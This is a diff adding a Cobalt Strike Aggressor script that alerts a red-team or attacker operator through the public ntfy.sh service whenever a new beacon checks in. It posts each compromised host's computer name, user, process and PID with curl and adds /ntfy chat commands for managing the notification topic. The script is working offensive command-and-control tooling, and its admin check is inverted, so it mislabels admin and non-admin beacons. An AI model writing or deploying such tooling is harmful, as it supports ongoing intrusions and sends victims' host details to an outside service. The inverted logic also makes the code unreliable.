@@ -1,0 +1,108 @@
+# Name: Aggressor-NTFY.cna
+# Author: @infosecnoodle
+# Date: 14/09/2024
+
+sub random_subscription {
+    $word_length = 5;
+    $word_count = 3;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyz";
+
+    for ($i = 0; $i < $word_count; $i++) {
+        $word = "";
+        for ($x = 0; $x < $word_length; $x++) {
+            $n = int(rand(strlen($characters)));
+            $word .= charAt($characters, $n);
+        }
+        add(@random_str, $word);
+    }
+
+    return join('-', @random_str);
+}
+
+global ('$ntfy-subscription');
+
+$ntfy-subscription = random_subscription();
+$ntfy-url = "https://ntfy.sh/";
+
+# event viewer cmds
+on event_public {
+    local('@input $cmd @args')
+
+    if (substr($2, 0, 1) eq "/") {
+        @input = split(" ", $2);
+        $cmd = @input[0];
+        @args = sublist(@input, 1);
+
+        if ($cmd eq "/ntfy") {
+            if (size(@args) == 0) {
+                say("- NTFY --------------------------------------------------------------------------------------");
+                say(" \cC/ntfy                                      View the help menu.");
+                say(" \cC/ntfy view                                 View the current ntfy subscription string.");
+                say(" \cC/ntfy test                                 Send a test notification.");
+                say(" \cC/ntfy set [subscription]                   Set the ntfy subscription string.");
+                say("---------------------------------------------------------------------------------------------");
+            }
+            else if (size(@args) == 1 && @args[0] eq "view") {
+                say("\cCCurrent subscription: \c9$ntfy-subscription"); # Example response, adjust as needed
+            }
+            else if (size(@args) == 1 && @args[0] eq "test") {
+                ntfy-test();
+                say("\cCTest notification sent to: \c9$ntfy-subscription");
+            }
+            else if (size(@args) == 2 && @args[0] eq "set") {
+                $ntfy-subscription = @args[1];
+                say("\cCSubscription set to: \c9$ntfy-subscription");
+            }
+            else {
+                say("\cCUnrecognised command. Use '/ntfy' for usage.");
+            }
+        }
+    }
+}
+
+sub ntfy-test {
+    $message = "Hello from Cobalt Strike!";
+	  @command = @('curl', '-d', $message, ($ntfy-url . $ntfy-subscription));
+	  exec(@command);
+}
+
+on beacon_initial {
+    $computer = beacon_info($1, "computer");
+    $external = beacon_info($1, "external");
+    $internal = beacon_info($1, "internal");
+    $listener = beacon_info($1, "listener");
+    $user = beacon_info($1, "user");
+    $pid = beacon_info($1, "pid");
+    $process = beacon_info($1, "process");
+  
+    if (-isadmin $1) {
+        $message = "New Beacon! $computer as $user in $process \(pid: $pid\)";
+    }
+    else {
+        $message = "New Admin Beacon! $computer as $user in $process \(pid: $pid\)";
+    }
+    @command = @('curl', '-d', $message, ($ntfy-url . $ntfy-subscription));
+    exec(@command);
+}
+
+on beacon_initial_empty {
+    $message = "New Ghost (DNS) Beacon!";
+    @command = @('curl', '-d', $message, ($ntfy-url . $ntfy-subscription));
+    exec(@command);
+}
+
+say("
+
+d8b   db d888888b d88888b db    db
+888o  88 `~~88~~' 88'     `8b  d8'
+88V8o 88    88    88ooo    `8bd8'
+88 V8o88    88    88~~~      88
+88  V888    88    88         88
+VP   V8P    YP    YP         YP
+\cE@infosecnoodle\o
+
+Using randomly-generated subscription: \c9$ntfy-subscription\o
+
+Use \cC/ntfy\o to see the list of available commands.
+");
